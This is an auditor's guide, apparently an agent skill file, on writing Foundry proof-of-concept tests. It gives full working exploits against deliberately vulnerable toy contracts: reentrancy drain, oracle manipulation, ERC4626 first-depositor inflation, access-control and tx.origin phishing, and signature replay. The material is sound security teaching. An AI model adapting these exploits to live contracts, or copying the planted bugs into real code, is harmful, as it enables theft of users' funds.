---
id: POC-WRITING-GUIDE
title: Proof of Concept Writing Guide
category: methodology
triggers:
  - write a PoC
  - proof of concept
  - how to demonstrate vulnerability
  - exploit template
  - foundry test structure
  - PoC best practices
related_skills:
  - methodology/audit-report-templates.md
  - patterns/reentrancy-patterns.md
  - patterns/flash-loan-patterns.md
  - patterns/oracle-patterns.md
---

#  Proof of Concept Writing Guide

## Overview

This guide teaches how to write effective PoCs that clearly demonstrate vulnerabilities. A good PoC proves exploitability and helps developers understand the fix.

---

## PoC Structure Template

Every PoC should follow this structure:

```
1. SETUP
   - Deploy vulnerable contract(s)
   - Set initial state (balances, roles, etc.)
   - Deploy attacker contract if needed

2. PRECONDITIONS
   - Log/assert initial state
   - Show what "normal" looks like

3. ATTACK
   - Execute the exploit steps
   - Clear comments explaining each step

4. POSTCONDITIONS
   - Assert the exploit succeeded
   - Show profit/damage quantified
```

---

## Reentrancy PoC Pattern

### What to Demonstrate
- Attacker can drain funds via callback
- State is inconsistent during external call

### Key Elements
```solidity
// SETUP: Deploy vulnerable bank with funds
// ATTACK: Attacker deposits small amount, then withdraws
// CALLBACK: In receive(), call withdraw again
// RESULT: Attacker gets more than deposited
```

### Assertions to Include
- `assertGt(attackerBalanceAfter, attackerBalanceBefore)`
- `assertLt(bankBalanceAfter, expectedBalance)`
- Show exact profit amount

### Common Mistakes
-  Not showing initial vs final balances
-  No comments explaining the flow
-  Hardcoded values without explanation
-  Clear setup → attack → verify flow

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// @notice Vulnerable: state update after external call
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        balances[msg.sender] = 0; // BUG: state update after external call
    }

    receive() external payable {}
}

contract ReentrancyAttacker {
    VulnerableBank immutable bank;

    constructor(VulnerableBank _bank) { bank = _bank; }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // Re-enter before balance zeroed
        }
    }
}

contract TestReentrancy is Test {
    VulnerableBank bank;
    ReentrancyAttacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        // 5 legitimate users deposit 2 ETH each = 10 ETH total
        for (uint160 i = 1; i <= 5; i++) {
            vm.deal(address(i), 2 ether);
            vm.prank(address(i));
            bank.deposit{value: 2 ether}();
        }
        attacker = new ReentrancyAttacker(bank);
    }

    function testReentrancyDrain() public {
        uint256 bankBefore = address(bank).balance; // 10 ETH
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        uint256 stolen = address(attacker).balance;
        emit log_named_decimal_uint("Bank before ", bankBefore, 18);
        emit log_named_decimal_uint("Stolen      ", stolen, 18);
        emit log_named_decimal_uint("Bank after  ", address(bank).balance, 18);

        assertEq(stolen, 11 ether);         // 10 drained + 1 own deposit
        assertEq(address(bank).balance, 0); // Bank fully drained
    }
}
// Run: forge test --match-test testReentrancyDrain -vvvv
```

---

## Flash Loan Attack PoC Pattern

### What to Demonstrate
- Temporary capital enables attack
- Price/state manipulation during loan
- Profitable despite fees

### Key Elements
```solidity
// SETUP: Target protocol with manipulable oracle
// BORROW: Flash loan large amount
// MANIPULATE: Affect price/state
// EXPLOIT: Profit from manipulation
// REPAY: Return loan + fee
// RESULT: Net profit after fees
```

### Assertions to Include
- `attackerProfitAfter > flashLoanFee`
- Protocol lost expected amount
- Oracle returned to normal (if applicable)

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// @notice AMM with spot-price oracle (vulnerable to manipulation)
contract VulnerableAMM {
    uint256 public reserveToken = 100_000e18;
    uint256 public reserveETH  = 100e18;

    function tokenPriceInETH() external view returns (uint256) {
        return (reserveETH * 1e18) / reserveToken; // Spot price as oracle
    }

    function swapETHForToken(uint256 ethIn) external returns (uint256 out) {
        out = (ethIn * reserveToken) / (reserveETH + ethIn);
        reserveETH += ethIn;
        reserveToken -= out;
    }

    function swapTokenForETH(uint256 tokenIn) external returns (uint256 out) {
        out = (tokenIn * reserveETH) / (reserveToken + tokenIn);
        reserveETH -= out;
        reserveToken += tokenIn;
    }
}

/// @notice Lending protocol that trusts AMM spot price
contract VulnerableLender {
    VulnerableAMM public amm;
    uint256 public totalETH = 50e18;

    constructor(VulnerableAMM _amm) { amm = _amm; }

    function borrow(uint256 tokenCollateral) external returns (uint256 ethOut) {
        uint256 price = amm.tokenPriceInETH(); // BUG: manipulable spot price
        ethOut = (tokenCollateral * price * 80) / (100 * 1e18); // 80% LTV
        require(ethOut <= totalETH, "Insufficient liquidity");
        totalETH -= ethOut;
    }
}

contract TestFlashLoanAttack is Test {
    VulnerableAMM amm;
    VulnerableLender lender;

    function setUp() public {
        amm = new VulnerableAMM();
        lender = new VulnerableLender(amm);
    }

    function testOracleManipulationViaSwap() public {
        uint256 honestPrice = amm.tokenPriceInETH();
        emit log_named_decimal_uint("Honest price ", honestPrice, 18);

        // Step 1: Flash-borrow 50 ETH, swap into pool
        uint256 tokensReceived = amm.swapETHForToken(50e18);

        // Step 2: Price inflated (fewer tokens in pool)
        uint256 manipulatedPrice = amm.tokenPriceInETH();
        emit log_named_decimal_uint("Manipulated  ", manipulatedPrice, 18);

        // Step 3: Borrow against inflated collateral
        uint256 borrowed = lender.borrow(tokensReceived);
        emit log_named_decimal_uint("Borrowed ETH ", borrowed, 18);

        // Step 4: Swap tokens back (repay flash loan)
        uint256 ethBack = amm.swapTokenForETH(tokensReceived);
        emit log_named_decimal_uint("ETH back     ", ethBack, 18);

        assertGt(manipulatedPrice, honestPrice, "Price was inflated");
        assertGt(borrowed, 0, "Borrowed against inflated collateral");
        emit log_named_uint("Price inflation %",
            ((manipulatedPrice - honestPrice) * 100) / honestPrice);
    }
}
// Run: forge test --match-test testOracleManipulationViaSwap -vvvv
```

---

## Oracle Manipulation PoC Pattern

### What to Demonstrate
- Stale price acceptance
- Zero/negative price handling
- Price deviation impact

### Key Elements
```solidity
// SETUP: Protocol using Chainlink oracle
// MOCK: Set stale timestamp or bad price
// EXPLOIT: Use bad price for profitable action
// RESULT: Show incorrect valuation impact
```

### Scenarios to Test
1. **Stale Price**: `updatedAt` older than heartbeat
2. **Zero Price**: Oracle returns 0
3. **Negative Price**: Oracle returns negative (rare but possible)
4. **Round Incomplete**: `answeredInRound < roundId`

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// @notice Mock Chainlink aggregator for testing
contract MockV3Aggregator {
    int256 public price;
    uint256 public updatedAt;
    uint80 public roundId;
    uint80 public answeredInRound;

    function set(int256 _p, uint256 _t, uint80 _r, uint80 _a) external {
        price = _p; updatedAt = _t; roundId = _r; answeredInRound = _a;
    }

    function latestRoundData() external view returns (
        uint80, int256, uint256, uint256, uint80
    ) {
        return (roundId, price, 0, updatedAt, answeredInRound);
    }
}

/// @notice Protocol with no oracle validation
contract VulnerableLending {
    address public feed;
    constructor(address _feed) { feed = _feed; }

    function getPrice() public view returns (uint256) {
        // BUG: No staleness check, no zero check, no round validation
        (, int256 answer,,,) = MockV3Aggregator(feed).latestRoundData();
        return uint256(answer);
    }

    function maxBorrow(uint256 collateralETH) external view returns (uint256) {
        return (collateralETH * getPrice()) / 1e8;
    }
}

contract TestOracleExploit is Test {
    MockV3Aggregator oracle;
    VulnerableLending lending;

    function setUp() public {
        oracle = new MockV3Aggregator();
        oracle.set(2000e8, block.timestamp, 10, 10); // $2000, fresh
        lending = new VulnerableLending(address(oracle));
    }

    function testStalePrice() public {
        oracle.set(2000e8, block.timestamp - 86400, 10, 10); // 24h stale
        uint256 borrow = lending.maxBorrow(10 ether);
        assertGt(borrow, 0, "Stale price accepted without revert");
        emit log("BUG: 24-hour-old price used for collateral valuation");
    }

    function testZeroPrice() public {
        oracle.set(0, block.timestamp, 10, 10);
        uint256 borrow = lending.maxBorrow(10 ether);
        assertEq(borrow, 0, "Zero price: all collateral valued at $0");
        emit log("BUG: Zero oracle price enables free liquidations");
    }

    function testNegativePriceWraps() public {
        oracle.set(-1, block.timestamp, 10, 10);
        uint256 price = lending.getPrice();
        assertGt(price, type(uint128).max, "Negative wraps to huge uint");
        emit log("BUG: int256(-1) cast to uint256 = type(uint256).max");
    }

    function testIncompleteRound() public {
        oracle.set(2000e8, block.timestamp, 10, 9); // answeredInRound < roundId
        uint256 borrow = lending.maxBorrow(10 ether);
        assertGt(borrow, 0, "Incomplete round accepted");
        emit log("BUG: Round not finalized but price still used");
    }
}
// Run: forge test --match-contract TestOracleExploit -vvvv
```

---

## First Depositor Attack PoC Pattern

### What to Demonstrate
- First depositor controls share price
- Small deposit + donation = share inflation
- Subsequent depositors lose funds

### Key Elements
```solidity
// SETUP: Empty vault
// ATTACKER: Deposit 1 wei, get 1 share
// DONATE: Send tokens directly to vault (e.g., 10000 tokens)
// VICTIM: Deposits 9999 tokens, gets 0 shares (rounded down)
// RESULT: Attacker redeems for victim's deposit
```

### Key Calculations
- Show exchange rate before/after donation
- Victim's expected shares vs actual shares
- Attacker's profit = victim's loss

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// @notice ERC4626-style vault vulnerable to share inflation
contract VulnerableVault {
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;

    function deposit(uint256 assets) external returns (uint256 mintedShares) {
        if (totalShares == 0) {
            mintedShares = assets;
        } else {
            mintedShares = (assets * totalShares) / totalAssets; // BUG: rounds down
        }
        shares[msg.sender] += mintedShares;
        totalShares += mintedShares;
        totalAssets += assets;
    }

    /// @dev Simulates direct token transfer (ERC20.transfer to vault)
    function donate(uint256 amount) external {
        totalAssets += amount;
    }

    function redeem(uint256 sharesToBurn) external returns (uint256 assets) {
        assets = (sharesToBurn * totalAssets) / totalShares;
        shares[msg.sender] -= sharesToBurn;
        totalShares -= sharesToBurn;
        totalAssets -= assets;
    }
}

contract TestFirstDepositor is Test {
    VulnerableVault vault;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function setUp() public {
        vault = new VulnerableVault();
    }

    function testShareInflation() public {
        // Step 1: Attacker deposits 1 wei -> gets 1 share
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(1);
        assertEq(attackerShares, 1);

        // Step 2: Attacker donates 10_000e18 directly to vault
        vm.prank(attacker);
        vault.donate(10_000e18);
        // State: totalAssets = 10_000e18 + 1, totalShares = 1

        // Step 3: Victim deposits 9_999e18
        // Shares = (9_999e18 * 1) / (10_000e18 + 1) = 0 (rounds down!)
        vm.prank(victim);
        uint256 victimShares = vault.deposit(9_999e18);

        emit log_named_uint("Attacker shares", attackerShares);
        emit log_named_uint("Victim shares  ", victimShares);
        assertEq(victimShares, 0, "Victim received ZERO shares");

        // Step 4: Attacker redeems -> gets own donation + victim's deposit
        vm.prank(attacker);
        uint256 payout = vault.redeem(1);

        emit log_named_decimal_uint("Attacker cost   ", 10_000e18 + 1, 18);
        emit log_named_decimal_uint("Attacker received", payout, 18);
        emit log_named_decimal_uint("Victim lost      ", 9_999e18, 18);
        assertGt(payout, 10_000e18, "Attacker stole victim funds");
    }
}
// Run: forge test --match-test testShareInflation -vvvv
```

---

## Access Control PoC Pattern

### What to Demonstrate
- Unauthorized user can call restricted function
- Privilege escalation path
- Missing modifier impact

### Key Elements
```solidity
// SETUP: Deploy with roles configured
// ATTACKER: Non-privileged account
// EXPLOIT: Call admin function successfully
// RESULT: State changed by unauthorized user
```

### Scenarios to Test
1. **Missing Modifier**: Function lacks `onlyOwner`
2. **Wrong Check**: `tx.origin` instead of `msg.sender`
3. **Initialization**: Unprotected `initialize()`
4. **Self-Destruct**: Missing protection on selfdestruct

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableToken {
    mapping(address => uint256) public balances;
    address public owner;
    bool public initialized;

    function initialize(address _owner) external {
        require(!initialized); // BUG: No access control on initialize
        owner = _owner;
        initialized = true;
    }

    function mint(address to, uint256 amount) external {
        require(tx.origin == owner); // BUG: tx.origin instead of msg.sender
        balances[to] += amount;
    }

    function setOwner(address newOwner) external {
        owner = newOwner; // BUG: Missing onlyOwner modifier
    }
}

/// @notice Phishing: if owner calls this, tx.origin == owner passes
contract Phisher {
    VulnerableToken immutable target;
    constructor(VulnerableToken _t) { target = _t; }

    function claimAirdrop() external {
        target.mint(address(this), 1_000_000e18);
    }
}

contract TestAccessControl is Test {
    VulnerableToken token;
    address owner    = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new VulnerableToken();
        vm.prank(owner);
        token.initialize(owner);
    }

    function testOwnershipTheft() public {
        vm.prank(attacker);
        token.setOwner(attacker);
        assertEq(token.owner(), attacker);

        vm.prank(attacker);
        token.mint(attacker, 1_000_000e18);
        assertEq(token.balances(attacker), 1_000_000e18);
        emit log("CRITICAL: setOwner() has no access control");
    }

    function testTxOriginPhishing() public {
        Phisher phisher = new Phisher(token);
        vm.prank(owner, owner); // msg.sender = phisher context, tx.origin = owner
        phisher.claimAirdrop();
        assertEq(token.balances(address(phisher)), 1_000_000e18);
        emit log("CRITICAL: tx.origin phishing via intermediary contract");
    }

    function testUnprotectedInitialize() public {
        VulnerableToken fresh = new VulnerableToken();
        vm.prank(attacker);
        fresh.initialize(attacker);
        assertEq(fresh.owner(), attacker);
        emit log("CRITICAL: Unprotected initialize() on implementation");
    }
}
// Run: forge test --match-contract TestAccessControl -vvvv
```

---

## Signature Replay PoC Pattern

### What to Demonstrate
- Same signature works twice
- Cross-chain replay possible
- Signature valid after intended expiry

### Key Elements
```solidity
// SETUP: Valid signature for action
// USE: Execute action with signature
// REPLAY: Execute same action again
// RESULT: Action performed twice with one signature
```

### Scenarios to Test
1. **No Nonce**: Signature lacks nonce
2. **No Deadline**: Signature valid forever
3. **No ChainId**: Valid on all chains
4. **Malleable**: (v, r, s) can be transformed

### Full Working Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableWallet {
    mapping(address => uint256) public balances;
    address public owner;

    constructor(address _owner) {
        owner = _owner;
        balances[_owner] = 100 ether; // Simplified: internal accounting
    }

    /// @dev BUG: No nonce, no deadline, no chainId in hash
    function transferWithSig(
        address to, uint256 amount, bytes memory sig
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(to, amount));
        bytes32 ethHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
        );
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(ethHash, v, r, s) == owner, "Bad sig");
        balances[owner] -= amount;
        balances[to] += amount;
    }

    function _split(bytes memory sig) internal pure
        returns (bytes32 r, bytes32 s, uint8 v)
    {
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

contract TestSignatureReplay is Test {
    uint256 constant OWNER_KEY = 0xA11CE;
    address owner;
    VulnerableWallet wallet;

    function setUp() public {
        owner = vm.addr(OWNER_KEY);
        wallet = new VulnerableWallet(owner);
    }

    function testReplayAttack() public {
        address recipient = makeAddr("recipient");
        uint256 amount = 10 ether;

        // Owner signs a one-time 10 ETH transfer
        bytes32 hash = keccak256(abi.encodePacked(recipient, amount));
        bytes32 ethHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Use 1: legitimate transfer
        wallet.transferWithSig(recipient, amount, sig);
        assertEq(wallet.balances(recipient), 10 ether);

        // Replay 2: same signature works again (no nonce!)
        wallet.transferWithSig(recipient, amount, sig);
        assertEq(wallet.balances(recipient), 20 ether);

        // Replay 3: unlimited replays possible
        wallet.transferWithSig(recipient, amount, sig);
        assertEq(wallet.balances(recipient), 30 ether);

        emit log_named_decimal_uint("Owner intended  ", 10 ether, 18);
        emit log_named_decimal_uint("Actually drained", 30 ether, 18);
        emit log("CRITICAL: No nonce = unlimited signature replays");
    }
}
// Run: forge test --match-test testReplayAttack -vvvv
```

---

## PoC Quality Checklist

### Must Have
- [ ] Clear setup with realistic values
- [ ] Comments explaining each step
- [ ] Before/after state logging
- [ ] Quantified impact (profit, loss, damage)
- [ ] Assertions proving the exploit

### Should Have
- [ ] Multiple attack scenarios if applicable
- [ ] Edge case demonstrations
- [ ] Mitigation that makes PoC fail
- [ ] Realistic token amounts (not just 1 wei)

### Nice to Have
- [ ] Gas costs for attack
- [ ] Time constraints (if any)
- [ ] Comparison with fixed version

---

## Foundry Test Commands

```bash
# Run specific PoC
forge test --match-test testExploit -vvvv

# Run with gas report
forge test --match-test testExploit --gas-report

# Fork mainnet for realistic test
forge test --fork-url $ETH_RPC_URL --match-test testExploit

# Debug specific test
forge test --match-test testExploit --debug
```

---

## Common PoC Anti-Patterns

###  Unrealistic Setup
```
"Attacker needs 1 billion tokens to exploit"
→ Not a realistic vulnerability
```

###  No Quantification
```
"Attacker gains tokens"
→ How many? What's the profit?
```

###  Missing Context
```
"Call withdraw() to exploit"
→ What state is needed? What's the attack flow?
```

###  Over-Complicated
```
100 lines of setup for simple bug
→ Minimize to essential elements
```

---

## PoC Report Template

When documenting your PoC:

```markdown
## Proof of Concept

### Setup
1. Deploy VulnerableContract with 100 ETH
2. Attacker starts with 1 ETH

### Attack Steps
1. Attacker calls deposit(1 ETH)
2. Attacker calls withdraw(1 ETH)
3. In receive callback, attacker calls withdraw(1 ETH) again
4. Repeat until contract drained

### Result
- Attacker profit: 99 ETH
- Protocol loss: 100 ETH (entire balance)

### Mitigation
Add ReentrancyGuard modifier to withdraw()
```

---

## Summary

A good PoC:
1. **Proves** the vulnerability exists
2. **Quantifies** the impact
3. **Explains** the attack flow
4. **Guides** the fix

Focus on clarity over complexity. The goal is to help developers understand and fix the issue.
